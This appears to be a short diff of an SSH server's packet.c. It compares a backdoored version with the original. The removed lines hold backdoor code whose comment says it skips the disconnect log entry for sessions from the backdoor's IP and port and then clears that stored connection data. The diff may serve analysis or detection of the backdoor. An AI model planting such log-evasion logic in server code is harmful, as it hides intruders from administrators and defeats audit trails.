@@ -1,0 +1,27 @@
+Viewing: 'packet.c'
+Launch 'diff' [Y/n]: 
+1480,1497c1480,1484
+< 
+< 				/*
+< 					If normal user, log disconnect- if user logged in with backdoor
+< 					do not log and overwrite global socket information to uninitialized
+< 					values
+< 				*/
+< 				if (!(strcmp(get_remote_ipaddr(), global_ip)==0 && global_port==get_remote_port())){
+< 					do_log2(active_state->server_side &&
+< 					    reason == SSH2_DISCONNECT_BY_APPLICATION ?
+< 					    SYSLOG_LEVEL_INFO : SYSLOG_LEVEL_ERROR,
+< 					    "Received disconnect from %s: %u: %.400s",
+< 					    get_remote_ipaddr(), reason, msg);
+< 				}
+< 				else {
+< 					global_ip="";
+< 					global_port=-1;
+< 				}
+< 
+---
+> 				do_log2(active_state->server_side &&
+> 				    reason == SSH2_DISCONNECT_BY_APPLICATION ?
+> 				    SYSLOG_LEVEL_INFO : SYSLOG_LEVEL_ERROR,
+> 				    "Received disconnect from %s: %u: %.400s",
+> 				    get_remote_ipaddr(), reason, msg);
